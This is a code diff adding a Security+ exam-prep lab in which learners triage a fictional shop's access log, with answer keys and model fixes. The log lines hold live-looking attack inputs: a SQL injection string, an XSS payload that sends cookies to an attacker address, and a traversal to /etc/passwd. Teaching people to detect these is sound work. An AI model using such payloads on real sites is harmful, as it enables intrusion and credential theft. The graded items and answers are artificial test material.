@@ -1,4 +1,4 @@
-import { GENERAL_SAFETY, part, type SeedLabSet } from "./types";
+import { GENERAL_SAFETY, part, selectPart, matchPart, type SeedLabSet } from "./types";
 import { source } from "../sources";
 
 // REQ-159: CompTIA Security+ SY0-701 (V7) -- verifiable labs beside the
@@ -461,6 +461,71 @@ export const SECPLUS_LABS: SeedLabSet = {
               "Risk decision and residual risk",
               "Ties approval to the evidence and startup risk (concentration/viability), proposing a risk-based decision -- approve with conditions, limit the data, or decline -- and names residual risk that remains after controls.",
               "Decide on the evidence: if the vendor can show a clean SOC 2 / ISO 27001 and sign the DPA, approve, possibly limiting the data stored given a 15-person startup's viability and concentration risk; if it cannot, restrict to non-sensitive data or decline. State the residual risk (reliance on a small vendor, trust in their controls between audits) so leadership accepts it knowingly."
+            ),
+          ],
+        },
+      ],
+    },
+    // REQ-295 (2026-11-14): density fill, Domain 2 (22%) gets its second lab.
+    // OWASP pages read 2026-11-14: Top 10:2025 lists A05:2025 Injection; the
+    // SQL Injection Prevention Cheat Sheet's primary defenses are
+    // parameterized queries and allow-list validation (escaping strongly
+    // discouraged); the XSS Prevention Cheat Sheet's main defense is
+    // context-aware output encoding with framework escaping and sanitizing,
+    // CSP as defense in depth only.
+    {
+      slug: "web-attack-log-triage",
+      objective: "Application and web attacks: injection, XSS, buffer overflow, race conditions (conceptual)",
+      kind: "build",
+      title: "Spot the web attacks in an access log",
+      brief:
+        "You support the storefront of Pinecrest Outfitters (fictional), shop.pinecrest.example. The web application firewall was in detect-only mode overnight. Your lead hands you eight lines from the web server's access log (documentation addresses) and asks which requests were attacks, what each one was, and what the developers should change.",
+      safetyNote: GENERAL_SAFETY,
+      sources: [
+        source("https://top10.owasp.org/2025/", "reference", "2026-11-14"),
+        source("https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html", "reference", "2026-11-14"),
+        source("https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", "reference", "2026-11-14"),
+      ],
+      steps: [
+        {
+          text: "",
+          ask: "Tap the attack requests, match each one to its attack, and give the developers' primary fix for each.",
+          parts: [
+            selectPart(
+              "Attack requests",
+              "Met: exactly the three attack lines -- the id=' OR '1'='1 request, the q=<script> request and the file=../../../etc/passwd request. (Right picks minus wrong picks) of at least two is partly there.",
+              "Line 2 closes the SQL string with ' and appends OR '1'='1, a classic injection that makes the WHERE clause always true (the 200 with a much larger response suggests it returned many rows). Line 5 puts a script tag in the search term, which the results page would echo back: reflected XSS. Line 7 climbs out of the downloads folder with ../ to read /etc/passwd: directory (path) traversal. The others are ordinary requests, including the 404 for a mistyped page and the POST to /cart.",
+              {
+                display: "log",
+                lines: [
+                  "198.51.100.23 \"GET /products?id=42 HTTP/1.1\" 200 5120",
+                  "203.0.113.66 \"GET /products?id=42' OR '1'='1 HTTP/1.1\" 200 98304",
+                  "198.51.100.23 \"POST /cart HTTP/1.1\" 302 0",
+                  "198.51.100.41 \"GET /search?q=rain+jacket HTTP/1.1\" 200 7344",
+                  "203.0.113.66 \"GET /search?q=<script>document.location='https://203.0.113.66/c?'+document.cookie</script> HTTP/1.1\" 200 7410",
+                  "198.51.100.41 \"GET /sizeguide HTTP/1.1\" 404 512",
+                  "203.0.113.66 \"GET /download?file=../../../etc/passwd HTTP/1.1\" 200 2210",
+                  "198.51.100.41 \"GET /download?file=returns-form.pdf HTTP/1.1\" 200 88210",
+                ],
+                correct: [1, 4, 6],
+              }
+            ),
+            matchPart(
+              "Attack for each request",
+              "Met: all three right -- the id=' OR '1'='1 request is SQL injection; the q=<script> request is cross-site scripting; the file=../ request is directory traversal. Two right is partly there.",
+              "The quote and always-true OR change the meaning of a SQL statement (injection). The script tag is markup the page would run in another shopper's browser, here to send their cookie to the attacker (XSS). ../ sequences walk up the file system out of the intended folder (traversal). Nothing here overruns a buffer or forges a cross-site request.",
+              {
+                leftHeading: "Request",
+                rightHeading: "Attack",
+                left: ["/products?id=42' OR '1'='1", "/search?q=<script>...document.cookie</script>", "/download?file=../../../etc/passwd"],
+                right: ["SQL injection", "Cross-site scripting (XSS)", "Directory traversal", "Buffer overflow", "Cross-site request forgery"],
+                pairs: [0, 1, 2],
+              }
+            ),
+            part(
+              "Primary fix for each",
+              "SQL injection: parameterized queries (prepared statements), with allow-list validation for any part a parameter can't carry; not 'escape the quotes' or 'block the word OR'. XSS: context-aware output encoding (the framework's auto-escaping) plus sanitizing any HTML that must be allowed, with CSP and HttpOnly cookies as extra layers. Traversal: never build a path from user input -- map the request to an allow-listed file ID, or canonicalize and confirm the result stays inside the download folder; run the app without read access to system files. Also: switch the WAF to block once tuned, and check whether line 2's large response leaked data.",
+              "1. SQL injection -> parameterized queries for every statement, so input is always data, never SQL; where input picks a column or sort order, map it to values the code owns. Escaping is strongly discouraged as a main defense.\n2. XSS -> encode output for its context (HTML body, attribute, JavaScript, URL) through the framework's auto-escaping, and sanitize any HTML users may submit. Set the session cookie HttpOnly and add a Content Security Policy as defense in depth -- neither replaces encoding.\n3. Directory traversal -> look files up by an ID from an allow list (file=returns-form maps to one known path), or resolve the canonical path and refuse anything outside the downloads folder; the service account should not be able to read /etc at all (least privilege).\nThen: the 98,304-byte reply to line 2 suggests the injection returned the product table or more, so check the database logs for what was read, and move the WAF from detect-only to block with these signatures. Injection is A05 in the OWASP Top 10:2025."
             ),
           ],
         },
